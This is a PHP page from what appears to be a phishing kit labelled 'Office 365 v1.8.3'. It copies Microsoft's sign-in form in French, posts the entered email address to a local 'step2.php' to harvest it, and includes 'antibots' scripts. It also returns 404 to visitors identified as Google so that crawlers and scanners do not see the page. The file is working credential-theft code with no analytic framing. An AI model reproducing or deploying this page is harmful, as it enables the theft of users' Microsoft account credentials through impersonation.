﻿<?php
/*
***********************************************************
*                                                         *
*                                                         *
*                    Office 365 v1.8.3                *
*                                [+] Office 365 v1.8.3    *
*                                                         *
*             Office 365 v1.8.3               *
*                                                         *
***********************************************************
*/
session_start();
include "./FUNC/antibots1.php";
include "./FUNC/antibots2.php";
include "./FUNC/antibots3.php";
include "./FUNC/antibots4.php";
include "./FUNC/antibots5.php";
include "./FUNC/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE html>
<html dir="ltr" class="" lang=“en”><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Microsoftonline</title>
    <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1036">
    <meta name="LocLC" content="fr-FR">
    <link rel="shortcut icon" href="./css/a.ico">

<link href="./css/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
    
    

<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --><!-- /ko --><!-- ko if: backgroundImageUrl --><!-- /ko --><!-- ko if: !!backgroundImageUrl() --><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"  action="step2.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle app" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: $loginPage.backgroundLogoUrl() }" src="./login_files/bannerlogo"> </div><!-- /ko --> <div class="inner app" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./login_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;WF_STR_HeaderDefault_Title&#39;]">To log in</div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="loginfmt" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: usernameTextbox.error },
                    attr: inputAttributes" type="email" placeholder="someone@example.com " aria-label="Entrez votre adresse de messagerie"> <input name="passwd" type="email" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]" aria-label="Veuillez patienter" style="display: none;"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="invertOrder: svr.fRepositionFooterButtons"> <div class="row"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { &#39;no-margin-bottom&#39;: removeBottomMargin, &#39;button-container&#39;: svr.fRepositionFooterButtons }"> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Précédent" style="display: none;"> </div> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-24"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                    params: {
                        availableCreds: availableCredsWithoutUsername },
                    event: {
                        switchView: noUsernameCredSwitchLink_onSwitchView } } --><!-- ko if: altCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=94c63fef-13a3-47bc-8074-75af8c65887a&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3dKoiqO06mATDYegK75TKR77RXwLUzIpaMB5KI-kqyVLPrzGZMLNtCReuGp6-IlnqdfhAHonxpgRGmuAdnxnhvFLOBxClpz3Vj4peYvrwdg6S7aUPTtEThGGWuJDmCMYPCjaxgW8-Yf4cVMTp0eR7Esc-wnKdRC1-uvK2brTVeY1_vJJ47xM8O9plKTrlkRKULaNkWz_rGQwwPBjJwDDFbJN_GeOZZqt_Xn_UMc8mul6UvXjOUuDFY75izJU6cfBCrE_nfznGADrDaeylaukki6Q&amp;nonce=636566699201201247.ODkwMTY4NGUtYTllZS00YzlhLWJmMWItOGM0YjE0NDIwNmIxMTlmZGExODQtZDA0MC00YzNkLWE4ODMtMDk2NTM4NDVmZGE1&amp;redirect_uri=https%3a%2f%2fnam.delve.office.com%2f&amp;client-request-id=de99417c-473c-4ac5-820c-4968904cae37&amp;msafed=0#" data-bind="text: str[&#39;WF_STR_CantAccessAccount_Text&#39;], click: cantAccessAccount_onClick">Forgot my password&nbsp;?</a> </div><!-- /ko --> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="BWuLi9TndmaG72zULDTuFyOlfxN+dGSmSU6Yt5+fZOQ=4:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAX2SP3OTcACGQ9PmWq-nPScXtYOTPRJICCQ5OySQIIQ_-QNJyZIj8CMhwA9CIFDOydUlq4516-Dg5Hnn6NKps4MfQB08J0ebL-Dde-_0TO_7PM_jRbzxrE4YZMUCFopX9ApKUDMDrWEUgVJV3aoZZLVWo_Tw4b2TV82331-wX_nXx9xiK3ygrpHHiygK1o1SCepe0QTuBhR9y7INUDR8r_QJQW4R5HpvTVbIKkmS9XoZw3chqKLMOImoaITEqpGmuO5kiGFa5i6EMe-JYy6SWRHTlm1MYrhE8rhUVFxvwrZTmelHE6aJifSOlxxh3CZkRoxExilLikhIzGjH4d_2HsjNOFqUd-WHdgb-7B1ZfuhNA38dvct_2ZMDADmT9iEERlTcYQBGtqFHtg97oR-AMLLB-rzr2ysZI72mwmhg3qWqSndAUYOLRFAzLtDFVrXLoc7qciT0woydiIIU0QMQswGJci5cmdai-dKHaTAfsF7cNGEKF5uOILdS2g2yymhJBEDbhIk5J4eUrvaUqK0sWHYc84xHi1qPXurpfFxDNYswRqISYGBAtdcGmsCuOaBxNN50y7NQGQENn254nqBSsSbXA7erhK4z6KqCLjnjbBqy_STptZZ8wjCdGS9NWSBPJqtoegGnqmjUvNgl1c3FUlZjpqNRVTvjVdKwWnTYnkIrg2yTCRkdXLp67Dg22f-YL9w97PnwJn__bipom6dB6Fu2C273kR_7x1i-cXhYOEEe5U5zf_eRq4M7fc6P3m-fzJ5Kb35et39dkbmbg1JrHAt2XYGmp7NUOVMFRok7l7JrpdKZyQ69oUpqUfXMmsj9c6KBbwvItlD4Xch9Pvq_ef8A0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="90a3093d-621e-4e1f-8beb-aa45eca23600"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAABHh4kmS_aKT5XrjzxRAtHz3RGwd9DsMw8BF1FXUWGOJ7add6tXduB8omS_wQ_aFXGC2Ffq4GsNGUjnUXl9MMr7Ozkw8MnP7Y7UBpNVidIcIALwpeJAEVh7XKBAs1HdZJDNpzZ9SQRACDBJv4uqmQRnq4u5JD1fo1ayiOUGWecgZisxf8g7oxegCVHSFfFu96zN3pTtyY1CniP7xDFtyeUgUHFYH9mSZhEWQl7VFqw_QkjaGuWW7FFL0_7Q4pjsIL60aUQXHfYze7oruB8Sp3PCaqcx8s1c6_w2l0tTS_s8lFOnBVQU6YNNXQxYv26941G_WBv0CtVFyryC7Crd6AMNIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/fr-FR/servicesagreement/">Conditions d'utilisation</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/fr-FR/privacystatement">Confidentialité et cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=94c63fef-13a3-47bc-8074-75af8c65887a&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3dKoiqO06mATDYegK75TKR77RXwLUzIpaMB5KI-kqyVLPrzGZMLNtCReuGp6-IlnqdfhAHonxpgRGmuAdnxnhvFLOBxClpz3Vj4peYvrwdg6S7aUPTtEThGGWuJDmCMYPCjaxgW8-Yf4cVMTp0eR7Esc-wnKdRC1-uvK2brTVeY1_vJJ47xM8O9plKTrlkRKULaNkWz_rGQwwPBjJwDDFbJN_GeOZZqt_Xn_UMc8mul6UvXjOUuDFY75izJU6cfBCrE_nfznGADrDaeylaukki6Q&amp;nonce=636566699201201247.ODkwMTY4NGUtYTllZS00YzlhLWJmMWItOGM0YjE0NDIwNmIxMTlmZGExODQtZDA0MC00YzNkLWE4ODMtMDk2NTM4NDVmZGE1&amp;redirect_uri=https%3a%2f%2fnam.delve.office.com%2f&amp;client-request-id=de99417c-473c-4ac5-820c-4968904cae37&amp;msafed=0#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;], attr: { title: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;] }" aria-label="Cliquez ici pour d&#39;autres options" title="Cliquez ici pour d&#39;autres options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="./login_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="./login_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --><!-- /ko --></div></body></html>